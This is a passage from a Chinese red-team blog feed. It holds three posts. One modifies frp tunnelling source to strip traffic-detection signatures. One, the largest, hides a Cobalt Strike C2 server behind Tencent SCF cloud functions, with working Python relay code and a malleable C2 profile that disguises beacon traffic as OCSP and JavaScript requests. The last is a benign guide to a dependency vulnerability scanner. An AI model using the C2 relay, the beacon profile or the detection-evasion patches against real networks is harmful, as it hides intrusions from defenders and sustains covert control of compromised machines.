ca.crt -CAkey ca.key -CAcreateserial \<br>-extfile &lt;(printf &quot;subjectAltName=DNS:client.com,DNS:example.client.com&quot;) \<br>-out client.crt<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208092321858.png" alt="证书文件列表"></p><h3 id="2-加载文件配置"><a href="#2-加载文件配置" class="headerlink" title="2.加载文件配置"></a>2.加载文件配置</h3><ul><li><p>frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-comment"># 生成证书的路径</span><br><span class="hljs-comment"># 通过将 frps.ini 的 [common] 中 tls_only 设置为 true，可以强制 frps 只接受 TLS 连接。</span><br><span class="hljs-attr">tls_only</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">tls_cert_file</span> = ./ca/server.crt<br><span class="hljs-attr">tls_key_file</span> = ./ca/server.key<br><span class="hljs-attr">tls_trusted_ca_file</span> = ./ca/ca.crt<br><br></code></pre></td></tr></table></figure></li><li><p>frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = 服务端ip<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-attr">tls_enable</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">tls_cert_file</span> = ./ca/client.crt<br><span class="hljs-attr">tls_key_file</span> = ./ca/client.key<br><span class="hljs-attr">tls_trusted_ca_file</span> = ./ca/ca.crt<br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">7777</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="3-tls加密效果"><a href="#3-tls加密效果" class="headerlink" title="3.tls加密效果"></a>3.tls加密效果</h3><ul><li>加密前</li></ul><p>​</p><ul><li><p>加密后</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img%E5%8A%A0%E5%AF%86%E5%90%8E%E6%B5%81%E9%87%8F.png" alt="image-20220809233132550"></p></li></ul><h3 id="4-缺陷"><a href="#4-缺陷" class="headerlink" title="4.缺陷"></a>4.缺陷</h3><ul><li>为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208092333209.png" alt="image-20220809233343178"></p><h3 id="5-解决-修改源码"><a href="#5-解决-修改源码" class="headerlink" title="5.解决-修改源码"></a>5.解决-修改源码</h3><ul><li><p>v0.44.0版本下在 pkg&#x2F;util&#x2F;net&#x2F;tls.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br><span class="hljs-comment">// 修改默认的0x17为0x18</span><br>FRPTLSHeadByte = <span class="hljs-number">0x18</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>重新编译frps和frpc，必须使用重新编译的frpc连接frps，不然会出错</p><p>此处编译linux amd64环境下的frp,也可以直接在frp目录下运行<code>./package.sh</code>脚本，会将各个平台上的frp版本进行编译并打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags &quot;-s -w&quot; -o ./frpc ./cmd/frpc<br>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags &quot;-s -w&quot; -o ./frps ./cmd/frps<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x2-不使用tls加密连接（不推荐）"><a href="#0x2-不使用tls加密连接（不推荐）" class="headerlink" title="0x2.不使用tls加密连接（不推荐）"></a>0x2.不使用tls加密连接（不推荐）</h2><h3 id="1-frp明文连接有很明显的特征"><a href="#1-frp明文连接有很明显的特征" class="headerlink" title="1.frp明文连接有很明显的特征"></a>1.frp明文连接有很明显的特征</h3><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208092345540.png" alt="image-20220809234549496"></p><h3 id="2-从源码中删除特征字段"><a href="#2-从源码中删除特征字段" class="headerlink" title="2.从源码中删除特征字段"></a>2.从源码中删除特征字段</h3><ul><li><p>pkg&#x2F;msg&#x2F;msg.go  修改请求包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Login <span class="hljs-keyword">struct</span> &#123;<br>Version      <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;a&quot;`</span><br>Hostname     <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;b&quot;`</span><br>Os           <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;c&quot;`</span><br>Arch         <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;d&quot;`</span><br>User         <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;e&quot;`</span><br>PrivilegeKey <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;f&quot;`</span><br>Timestamp    <span class="hljs-type">int64</span>             <span class="hljs-string">`json:&quot;2022&quot;`</span><br>RunID        <span class="hljs-type">string</span>            <span class="hljs-string">`json:&quot;r&quot;`</span><br>Metas        <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;m&quot;`</span><br><br><span class="hljs-comment">// Some global configures.</span><br>PoolCount <span class="hljs-type">int</span> <span class="hljs-string">`json:&quot;g&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> LoginResp <span class="hljs-keyword">struct</span> &#123;<br>Version       <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;a&quot;`</span><br>RunID         <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;b&quot;`</span><br>ServerUDPPort <span class="hljs-type">int</span>    <span class="hljs-string">`json:&quot;c&quot;`</span><br>Error         <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;d&quot;`</span><br>&#125;<br><br><br><span class="hljs-keyword">type</span> NewWorkConn <span class="hljs-keyword">struct</span> &#123;<br>RunID        <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;rx&quot;`</span><br>PrivilegeKey <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;pk&quot;`</span><br>Timestamp    <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;to&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>client&#x2F;service.go 修改请求包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// &quot;github.com/fatedier/frp/pkg/util/version&quot;</span><br><br>loginMsg := &amp;msg.Login&#123;<br>Arch:      <span class="hljs-string">&quot;1&quot;</span>,<br>Os:        <span class="hljs-string">&quot;2&quot;</span>,<br>PoolCount: svr.cfg.PoolCount,<br>User:      <span class="hljs-string">&quot;4&quot;</span>,<br>Version:   <span class="hljs-string">&quot;5&quot;</span>,<br>Timestamp: time.Now().Unix(),<br>RunID:     svr.runID,<br>Metas:     svr.cfg.Metas,<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>server&#x2F;control.go 修改响应包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// &quot;github.com/fatedier/frp/pkg/util/version&quot;</span><br><br>loginRespMsg := &amp;msg.LoginResp&#123;<br>Version:       <span class="hljs-string">&quot;0&quot;</span>,<br>RunID:         ctl.runID,<br>ServerUDPPort: ctl.serverCfg.BindUDPPort,<br>Error:         <span class="hljs-string">&quot;&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>pkg&#x2F;util&#x2F;version&#x2F;version.go 修改版本最低认证要求，必须改，不然无法正常连接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Compat</span><span class="hljs-params">(client <span class="hljs-type">string</span>)</span></span> (ok <span class="hljs-type">bool</span>, msg <span class="hljs-type">string</span>) &#123;<br><span class="hljs-comment">// if LessThan(client, &quot;0.18.0&quot;) &#123;</span><br><span class="hljs-comment">// return false, &quot;Please upgrade your frpc version to at least 0.18.0&quot;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编译重新打包</p></li></ul><h3 id="3-修改后的明文连接"><a href="#3-修改后的明文连接" class="headerlink" title="3.修改后的明文连接"></a>3.修改后的明文连接</h3><ul><li>已无明显frp特征</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208092359930.png" alt="image-20220809235923888"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>红队tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCF云函数之C2隐藏</title>
    <link href="/2022/08/05/SCF%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8BC2%E9%9A%90%E8%97%8F/"/>
    <url>/2022/08/05/SCF%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8BC2%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="SCF云函数之C2隐藏"><a href="#SCF云函数之C2隐藏" class="headerlink" title="SCF云函数之C2隐藏"></a>SCF云函数之C2隐藏</h1><blockquote><p>踩了2个坑，记录一下</p><p>1.<strong>运行环境选python3.6，python3.7没有requests依赖包！</strong></p><p>2.<strong>C2地址只能选80或者443端口，因为SCF只支持这两个端口</strong></p></blockquote><h2 id="0x1-云函数原理"><a href="#0x1-云函数原理" class="headerlink" title="0x1.云函数原理"></a>0x1.云函数原理</h2><p>木马连接请求-&gt;SCF云函数(腾讯ip)转发-&gt;cs server</p><h2 id="0x2-云函数配置"><a href="#0x2-云函数配置" class="headerlink" title="0x2.云函数配置"></a>0x2.云函数配置</h2><p><a href="https://console.cloud.tencent.com/scf/">腾讯云后台云函数配置</a></p><ol><li><p>函数服务-&gt;新建</p><ul><li><p>基础配置</p><p><strong>运行环境选python3.6，python3.7没有requests依赖包！</strong></p></li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208051902890.png" alt="基础配置"></p><ul><li><p>函数代码</p><p><strong>C2地址只能选80或者443端口，因为SCF只支持这两个端口</strong></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><br><span class="hljs-keyword">import</span> json,base64,requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_handler</span>(<span class="hljs-params">event, context</span>):<br>    response = &#123;&#125;<br>    path = <span class="hljs-literal">None</span><br>    headers = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 根据自己云服务器的地址修改</span><br>        C2=<span class="hljs-string">&#x27;https://vps&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> event.keys():<br>            path=event[<span class="hljs-string">&#x27;path&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;headers&#x27;</span> <span class="hljs-keyword">in</span> event.keys():<br>            headers=event[<span class="hljs-string">&#x27;headers&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;httpMethod&#x27;</span> <span class="hljs-keyword">in</span> event.keys() <span class="hljs-keyword">and</span> event[<span class="hljs-string">&#x27;httpMethod&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> :<br>            resp=requests.get(C2+path,headers=headers,verify=<span class="hljs-literal">False</span>) <br>        <span class="hljs-keyword">else</span>:<br>            resp=requests.post(C2+path,data=event[<span class="hljs-string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="hljs-literal">False</span>)<br>            <span class="hljs-built_in">print</span>(resp.headers)<br>            <span class="hljs-built_in">print</span>(resp.content)<br>        response=&#123;<br>            <span class="hljs-string">&quot;isBase64Encoded&quot;</span>: <span class="hljs-literal">True</span>,<br>            <span class="hljs-string">&quot;statusCode&quot;</span>: resp.status_code,<br>            <span class="hljs-string">&quot;headers&quot;</span>: <span class="hljs-built_in">dict</span>(resp.headers),<br>            <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-built_in">str</span>(base64.b64encode(resp.content))[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]<br>        &#125;<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;error&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><ul><li>触发器配置</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208051945420.png" alt="触发器配置"></p></li><li><p>API网关配置</p><ul><li>跳转到api网关编辑页面，将路径设置为<code>/</code></li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208051946636.png" alt="api"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgapi2.png" alt="image-20220805194757158"></p><ul><li>api访问地址为cs连接地址<code>service-xx.gz.apigw.tencentcs.com</code></li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgapi3.png" alt="image-20220805195117379"></p></li></ol><h2 id="0x3-cs-server端配置"><a href="#0x3-cs-server端配置" class="headerlink" title="0x3.cs server端配置"></a>0x3.cs server端配置</h2><ul><li>profile配置文件</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">set</span> <span class="hljs-string">sample_name &quot;func&quot;;</span><br><span class="hljs-comment"># 设置默认sleep时间 10s</span><br><span class="hljs-attr">set</span> <span class="hljs-string">sleeptime &quot;10000&quot;; </span><br><span class="hljs-attr">set</span> <span class="hljs-string">jitter    &quot;0&quot;;</span><br><span class="hljs-attr">set</span> <span class="hljs-string">maxdns    &quot;255&quot;;</span><br><span class="hljs-attr">set</span> <span class="hljs-string">useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># https证书自行申请</span><br><span class="hljs-attr">https-certificate</span> <span class="hljs-string">&#123;</span><br>    <span class="hljs-attr">set</span> <span class="hljs-string">keystore &quot;xx&quot;;#证书名字</span><br>    <span class="hljs-attr">set</span> <span class="hljs-string">password &quot;xx&quot;;#证书密码</span><br><span class="hljs-attr">&#125;</span><br><span class="hljs-attr">http-get</span> <span class="hljs-string">&#123;</span><br><br>    <span class="hljs-attr">set</span> <span class="hljs-string">uri &quot;/api/get&quot;;</span><br><br>    <span class="hljs-attr">client</span> <span class="hljs-string">&#123;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Accept&quot; &quot;*/*&quot;;</span><br>        <span class="hljs-attr">metadata</span> <span class="hljs-string">&#123;</span><br>            <span class="hljs-attr">base64;</span><br>            <span class="hljs-attr">prepend</span> <span class="hljs-string">&quot;SESSIONID=&quot;;</span><br>            <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Cookie&quot;;</span><br>        <span class="hljs-attr">&#125;</span><br>    <span class="hljs-attr">&#125;</span><br><br>    <span class="hljs-attr">server</span> <span class="hljs-string">&#123;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Server&quot; &quot;Nodejs&quot;;</span><br>        <span class="hljs-attr">output</span> <span class="hljs-string">&#123;</span><br>            <span class="hljs-attr">base64;</span><br>            <span class="hljs-attr">print;</span><br>        <span class="hljs-attr">&#125;</span><br>    <span class="hljs-attr">&#125;</span><br><span class="hljs-attr">&#125;</span><br><span class="hljs-attr">http-stager</span> <span class="hljs-string">&#123;</span><br>    <span class="hljs-attr">set</span> <span class="hljs-string">uri_x86 &quot;/vue.min.js&quot;;</span><br>    <span class="hljs-attr">set</span> <span class="hljs-string">uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="hljs-attr">&#125;</span><br><span class="hljs-attr">http-post</span> <span class="hljs-string">&#123;</span><br>    <span class="hljs-attr">set</span> <span class="hljs-string">uri &quot;/api/post&quot;;</span><br>    <span class="hljs-attr">client</span> <span class="hljs-string">&#123;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Accept&quot; &quot;*/*&quot;;</span><br>        <span class="hljs-attr">id</span> <span class="hljs-string">&#123;</span><br>            <span class="hljs-attr">base64;</span><br>            <span class="hljs-attr">prepend</span> <span class="hljs-string">&quot;JSESSION=&quot;;</span><br>            <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Cookie&quot;;</span><br>        <span class="hljs-attr">&#125;</span><br>        <span class="hljs-attr">output</span> <span class="hljs-string">&#123;</span><br>            <span class="hljs-attr">base64;</span><br>            <span class="hljs-attr">print;</span><br>        <span class="hljs-attr">&#125;</span><br>    <span class="hljs-attr">&#125;</span><br><br>    <span class="hljs-attr">server</span> <span class="hljs-string">&#123;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br>        <span class="hljs-attr">header</span> <span class="hljs-string">&quot;Connection&quot; &quot;keep-alive&quot;;</span><br>        <span class="hljs-attr">output</span> <span class="hljs-string">&#123;</span><br>            <span class="hljs-attr">base64;</span><br>            <span class="hljs-attr">print;</span><br>        <span class="hljs-attr">&#125;</span><br>    <span class="hljs-attr">&#125;</span><br><span class="hljs-attr">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>创建监听器</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208052009637.png" alt="handler"></p><h2 id="0x4-效果演示"><a href="#0x4-效果演示" class="headerlink" title="0x4.效果演示"></a>0x4.效果演示</h2><ul><li>上线后自动切换ip，（腾讯云SCF的代理ip）</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgscf.gif" alt="c2隐藏2"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队tips</tag>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dependency-Check SCA工具使用指南</title>
    <link href="/2022/08/03/Dependency-Check-SCA%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2022/08/03/Dependency-Check-SCA%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="Dependency-Check-SCA工具使用指南"><a href="#Dependency-Check-SCA工具使用指南" class="headerlink" title="Dependency-Check SCA工具使用指南"></a>Dependency-Check SCA工具使用指南</h1><h2 id="0x1-工具介绍"><a href="#0x1-工具介绍" class="headerlink" title="0x1.工具介绍"></a>0x1.工具介绍</h2><blockquote><p>官方翻译：Dependency-Check是一种软件组成分析（SCA）工具，它试图检测项目依赖项中包含的公开披露的漏洞。它通过确定给定依赖项是否存在通用平台枚举（CPE）标识符来完成此操作。如果找到，它将生成一个报告，链接到相关的CVE条目。</p></blockquote><hr><ul><li>扫描原理：分析当前项目中的组件依赖包版本与公开漏洞库中的对应版本漏洞进行对比，比如你项目中依赖了Struts 2.0.0，那这个工具会告诉你Struts2.0.0相关的jar包存在风险</li></ul><h2 id="0x2-工具使用"><a href="#0x2-工具使用" class="headerlink" title="0x2.工具使用"></a>0x2.工具使用</h2><h3 id="2-1-工具下载安装"><a href="#2-1-工具下载安装" class="headerlink" title="2.1 工具下载安装"></a>2.1 工具下载安装</h3><ul><li><p>Github开源项目<a href="https://github.com/jeremylong/DependencyCheck">Dependency-Check地址</a></p></li><li><p>下载安装最新的<a href="https://github.com/jeremylong/DependencyCheck/releases/">release版本</a>,解压并安装</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208031632887.png" alt="image-20220803163230835"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="image-20220803163336650"></p></li></ul><h3 id="2-2-扫描"><a href="#2-2-扫描" class="headerlink" title="2.2 扫描"></a>2.2 扫描</h3><h4 id="2-2-1在线对比公开漏洞库（CVE、CWE、CPE）"><a href="#2-2-1在线对比公开漏洞库（CVE、CWE、CPE）" class="headerlink" title="2.2.1在线对比公开漏洞库（CVE、CWE、CPE）"></a>2.2.1在线对比公开漏洞库（CVE、CWE、CPE）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./bin/dependency-check.sh --project &quot;my_app&quot; --scan &quot;/tmp/mnt/spring-cloud-gateway-0.0.1-SNAPSHOT.jar&quot; -f CSV -o vuln.csv<br></code></pre></td></tr></table></figure><blockquote><p>–project “my_app” 指定扫描项目名</p><p>–scan “&#x2F;tmp&#x2F;mnt&#x2F;spring-cloud-gateway-0.0.1-SNAPSHOT.jar” 指定扫描系统，此处扫描使用了spring-cloud-gateway rce的靶场地址</p><p>-f CSV 指定扫描报告格式（默认HTML,必须大写）</p><p>-o vuln.csv 指定扫描报告导出地址和文件名</p></blockquote><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208031642378%E6%89%AB%E6%8F%8F%E5%AE%8C%E6%88%90.png" alt="image-20220803164206353"></p><h4 id="2-2-2-使用本地漏洞库进行扫描"><a href="#2-2-2-使用本地漏洞库进行扫描" class="headerlink" title="2.2.2 使用本地漏洞库进行扫描"></a>2.2.2 使用本地漏洞库进行扫描</h4><ol><li>将漏洞库下载到本地</li></ol><p>​<a href="https://github.com/stevespringett/nist-data-mirror/releases/">nist-data-mirror漏洞镜像项目地址</a> ，第一次下载耗时较久</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar nist-data-mirror.jar /usr/share/nginx/html/nist-data<br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;nist-data 是nginx的目录,存放漏洞库文件</p></blockquote><ol start="2"><li>从本地加载漏洞库</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./bin/dependency-check.sh --project test -s ../spring-cloud-gateway-0.0.1-SNAPSHOT.jar -f CSV -o vuln.csv --cveUrlModified https://127.0.0.1/nist-data/nvdcve-1.1-modified.json.gz --cveUrlBase https://127.0.0.1/nist-data/nvdcve-1.1-%d.json.gz<br></code></pre></td></tr></table></figure><blockquote><p>–project “my_app” 指定扫描项目名</p><p>–scan “&#x2F;tmp&#x2F;mnt&#x2F;spring-cloud-gateway-0.0.1-SNAPSHOT.jar” 指定扫描系统，此处扫描使用了spring-cloud-gateway rce的靶场地址</p><p>-f CSV 指定扫描报告格式（默认HTML,必须大写）</p><p>-o vuln.csv 指定扫描报告导出地址和文件名</p><p>–cveUrlModified 指定cve-modified文件，选择 nvdcve-1.1-modified.json.gz的url路径</p><p>–cveUrlBase 指定当年的cve文件，选择nvdcve-1.1-%d.json.gz的url路径</p><p>至于cveUrlModified和cveUrlBase为什么选这两个，我也不懂，看官网参数的默认值就是这两个，毕竟没有中文文档，<a href="https://jeremylong.github.io/DependencyCheck/dependency-check-maven/configuration.html?spm=a2c6h.12873639.article-detail.6.32f42378QRDyy2">文档地址</a>。</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208042302372.png" alt="参数详情"></p></blockquote><p>尝试换参数</p><h3 id="2-3查看扫描报告"><a href="#2-3查看扫描报告" class="headerlink" title="2.3查看扫描报告"></a>2.3查看扫描报告</h3><ul><li>主要内容就4列，扫描依赖名称、对应物理路径、描述、漏洞编号</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208031646698%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A.png" alt="image-20220803164534892"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>漏扫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>钓鱼演示合集</title>
    <link href="/2022/07/01/%E9%92%93%E9%B1%BC%E6%BC%94%E7%A4%BA%E5%90%88%E9%9B%86/"/>
    <url>/2022/07/01/%E9%92%93%E9%B1%BC%E6%BC%94%E7%A4%BA%E5%90%88%E9%9B%86/</url>
    
